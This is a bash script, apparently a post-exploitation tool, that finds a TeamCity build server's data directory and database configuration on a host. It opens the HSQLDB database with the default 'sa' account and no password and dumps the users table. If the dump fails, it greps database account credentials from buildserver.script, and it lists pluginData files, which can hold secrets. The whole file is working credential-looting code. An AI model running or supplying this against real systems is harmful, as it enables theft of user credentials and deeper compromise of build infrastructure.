#!/bin/bash

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
GREY='\033[0;37m'
NC='\033[0m' # No Color

cd lib/


### Check if sqltool.jar and hsqldb.jar exist
if [ ! -f "sqltool.jar" ]; then
    echo -e "$RED[-]$NC sqltool.jar not found"
    exit 1
fi

if [ ! -f "hsqldb.jar" ]; then
    echo -e "$RED[-]$NC hsqldb.jar not found"
    exit 1
fi


### Find the TeamCity build server
datafile=$(find / -name 'buildserver.data' -type f -exec echo {} \; -quit 2>/dev/null)
if [ -z "$datafile" ]; then
    echo -e "$RED[-]$NC Could not find the TeamCity build server data file"
    exit 1
fi

buildserver_dir=$(dirname $datafile)
echo -e "$CYAN[+]$NC Found TeamCity build server directory: $CYAN$buildserver_dir$NC"

echo -e "$YELLOW[*]$NC Contents of $CYAN$buildserver_dir$NC:"
echo -ne "$GREY"
ls -la $buildserver_dir
echo -ne "$NC"


### Find the TeamCity database configuration
dbconfig=$(find / -name 'database.properties' -type f -exec echo {} \; -quit 2>/dev/null)
if [ -z "$dbconfig" ]; then
    echo -e "$RED[-]$NC Could not find the TeamCity database configuration file"
    exit 1
fi

echo -e "$CYAN[+]$NC Found TeamCity database configuration file: $CYAN$dbconfig$NC"

# Grab configuration directory
configdir=$(dirname $dbconfig)
echo -e "$YELLOW[*]$NC Configuration directory: $CYAN$configdir$NC"

# Grab database connection url
dburl=$(grep 'connectionUrl' $dbconfig | cut -d'=' -f2)
# Replace "$TEAMCITY_SYSTEM_PATH" with $buildserver_dir
dburl=$(echo $dburl | sed "s#\$TEAMCITY_SYSTEM_PATH#$buildserver_dir#g")
# Replace "\:" with ":"
dburl=$(echo $dburl | sed 's#\\:#:#g')

echo -e "$YELLOW[*]$NC Database connection URL: $CYAN$dburl$NC"


### Continue if the database is HSQLDB
if [[ $dburl == *"hsqldb"* ]]; then
    echo -e "$CYAN[+]$NC Database is HSQLDB"

    echo -e "$YELLOW[*]$NC Extracting database contents..."
    cmd='java -jar sqltool.jar --driver=org.hsqldb.jdbcDriver --inlineRc=url='$dburl'\;readonly=true\;hsqldb.lock_file=false\;user=sa,password= --sql="SELECT * FROM users;"'
    echo -e "$GREY$cmd$NC"
    success=$(eval "$cmd")
    if [ -z "$success" ]; then
        echo -e "$RED[-]$NC Could not extract database contents"
        echo -e "$YELLOW[*]$NC Try checking the database creds in $CYAN$buildserver_dir/buildserver.script$NC:"

        echo -e "$GREY"
        grep 'CREATE USER' $buildserver_dir/buildserver.script
        echo -e "$NC"

        exit 1
    else
        echo -e "$RED[!]$NC Database contents extracted successfully"
        echo -e "$GREY$success$NC"
    fi
else
    echo -e "$RED[-]$NC Database is not HSQLDB, try to connect manually"
    exit 1
fi

### List all files in pluginData directories under the configuration directory
echo -e "$YELLOW[*]$NC Listing all files in pluginData directories under $CYAN$configdir$NC:"
echo -ne "$GREY"
find $configdir -type d -name 'pluginData' -exec find {} -type f \;
echo -ne "$NC"
